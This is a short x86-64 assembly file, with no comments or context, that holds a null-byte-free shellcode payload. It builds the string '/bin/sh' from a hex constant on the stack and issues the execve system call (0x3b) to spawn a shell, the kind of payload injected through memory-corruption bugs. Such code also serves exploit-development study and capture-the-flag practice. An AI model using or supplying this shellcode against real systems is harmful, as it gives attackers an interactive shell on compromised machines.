.intel_syntax noprefix
.globl _start
_start:
    xor rax,rax
    push rax
    pop rsi
    push rax
    pop rdx
    push rax
    mov rdi,0x68732f6e69622f2f
    shr rdi,0x8
    push rdi
    push rsp
    pop rdi
    mov al,0x3b
    syscall
